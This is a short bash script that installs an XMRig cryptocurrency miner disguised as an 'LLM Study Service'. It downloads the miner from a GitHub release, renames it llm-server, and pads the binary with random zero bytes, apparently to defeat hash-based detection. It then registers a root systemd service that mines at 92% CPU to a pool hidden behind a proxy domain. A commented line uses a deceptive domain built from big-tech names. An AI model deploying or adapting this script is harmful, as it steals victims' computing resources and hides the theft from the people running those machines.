#!/bin/bash

#llmproxy.6553500.xyz

U=$1
#latest=`wget -qO- -t1 -T2 "https://api.github.com/repos/xmrig/xmrig/releases/latest" | grep "tag_name" | head -n 1 | awk -F ":" '{print $2}' | sed 's/\"//g;s/,//g;s/ //g' | awk -F "v" '{print $2}'`
wget https://github.com/caippx/xmrig/releases/download/6.22.2/llm.zip 
unzip llm.zip && rm -rf llm.zip
mkdir /etc/llm/
mv llm /etc/llm/llm-server
cd /etc/llm
count=$((RANDOM % 1000 + 1))
for ((i = 0; i < count; i++)); do
  echo -n "0" >> "/etc/llm/llm-server"
done
cat > /etc/systemd/system/llm.service <<EOL
[Unit]
Description=LLM Study Service
After=network.target

[Service]
Type=simple
ExecStart=/etc/llm/llm-server --max-cpu-usage 92 -o llmproxy.6553500.xyz:443 -u $U -p x -k --tls --huge-pages-jit --asm=auto 
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
EOL

systemctl daemon-reload
systemctl enable llm.service
systemctl start llm.service
sleep 2
systemctl status llm.service
#./openai -a rx -o stratum+ssl://rx.microsoftazureamazonawsibmapplenvidiaoracleciscoadobe.com:443 -u $U -p x
